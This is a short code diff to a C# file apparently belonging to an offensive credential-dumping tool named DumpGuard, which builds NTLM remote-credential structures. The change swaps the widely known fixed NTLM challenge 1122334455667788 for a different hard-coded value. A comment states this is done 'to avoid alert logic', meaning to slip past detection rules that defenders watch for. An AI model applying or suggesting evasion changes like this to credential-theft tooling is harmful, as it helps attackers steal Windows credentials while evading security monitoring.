@@ -134,7 +134,10 @@ namespace DumpGuard
             var ntlm_cred_buffer = input.Skip(Marshal.SizeOf<MSV1_0_REMOTE_SUPPLEMENTAL_CREDENTIAL_HEADER>()).ToArray();
             var ntlm_cred_buffer_handle = GCHandle.Alloc(ntlm_cred_buffer, GCHandleType.Pinned);
 
-            var nt_challenge = new byte[] { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
+            // 1122334455667788 commmented to avoid alert logic uncomment at your own risk
+            //var nt_challenge = new byte[] { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
+            // if changing challenge don't forget to update Program.cs#L338 & Program.cs#L306
+            var nt_challenge = new byte[] { 0x3f, 0x9a, 0x7c, 0x2b, 0x1e, 0x4d, 0x8f, 0x6a };
             var nt_challenge_handle = GCHandle.Alloc(nt_challenge, GCHandleType.Pinned);
 
             var remote_secrets = new MSV1_0_REMOTE_ENCRYPTED_SECRETS(ntlm_cred_header, ntlm_cred_buffer_handle.AddrOfPinnedObject());
